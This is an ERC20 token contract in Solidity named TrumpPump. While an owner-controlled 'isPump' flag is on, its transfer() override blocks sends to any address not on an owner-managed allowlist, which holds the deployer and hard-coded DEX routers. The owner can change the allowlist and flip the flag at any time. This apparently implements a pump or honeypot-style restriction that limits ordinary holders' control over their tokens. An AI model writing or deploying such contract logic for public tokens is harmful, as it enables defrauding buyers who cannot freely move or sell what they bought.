// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "lib/openzeppelin-contracts/contracts/access/Ownable.sol";

contract TrumpPump is ERC20, Ownable {
    uint256 oneToken = 10 ** decimals();

    bool public isPump = true;

    address constant ROUTER_UNISWAP_V2 =
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant ROUTER_SUSHI_SWAP_V2 =
        0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address constant ROUTER_PULSEX_SWAP_ROUTER =
        0xDA9aBA4eACF54E0273f56dfFee6B8F1e20B23Bba;
    address constant ROUTER_PULSEX_V1 =
        0x98bf93ebf5c380C0e6Ae8e192A7e2AE08edAcc02;
    address constant ROUTER_PULSEX_V2 =
        0x165C3410fC91EF562C50559f7d2289fEbed552d9;
    address constant ROUTER_SHIBASWAP =
        0x03f7724180AA6b939894B5Ca4314783B0b36b329;
    address constant ROUTER_9MM_V2 = 0xcC73b59F8D7b7c532703bDfea2808a28a488cF47;
    address constant ROUTER_9INCH_V2 =
        0xeB45a3c4aedd0F47F345fB4c8A1802BB5740d725;
    address constant ROUTER_PULSE_RATE_V2 =
        0x71bb8a2feD36aa2dEa9f8f9Cb43E038315Dd7ba3;
    address constant ROUTER_EZSWAP_V2 =
        0x05d5F20500eD8d9E012647E6CFe1b2Bf89f5b926;

    mapping(address => bool) public canTransfer;

    constructor(
        string memory name,
        string memory symbol
    ) ERC20(name, symbol) Ownable(msg.sender) {
        _mint(msg.sender, oneToken * 1_000_000_000);

        canTransfer[msg.sender] = true;
        canTransfer[ROUTER_UNISWAP_V2] = true;
        canTransfer[ROUTER_SUSHI_SWAP_V2] = true;
        canTransfer[ROUTER_PULSEX_SWAP_ROUTER] = true;
        canTransfer[ROUTER_PULSEX_V1] = true;
        canTransfer[ROUTER_PULSEX_V2] = true;
        canTransfer[ROUTER_SHIBASWAP] = true;
        canTransfer[ROUTER_9MM_V2] = true;
        canTransfer[ROUTER_9INCH_V2] = true;
        canTransfer[ROUTER_PULSE_RATE_V2] = true;
        canTransfer[ROUTER_EZSWAP_V2] = true;
    }

    // Override the transfer function
    function transfer(
        address to,
        uint256 value
    ) public override returns (bool) {
        if (isPump) {
            require(canTransfer[to], "Transfer not allowed to this address");
        }

        // Call the original transfer function
        return super.transfer(to, value);
    }

    function setCanTransfer(
        address account,
        bool _canTransfer
    ) public onlyOwner {
        canTransfer[account] = _canTransfer;
    }

    function setIsPump(bool _isPump) public onlyOwner {
        isPump = _isPump;
    }
}
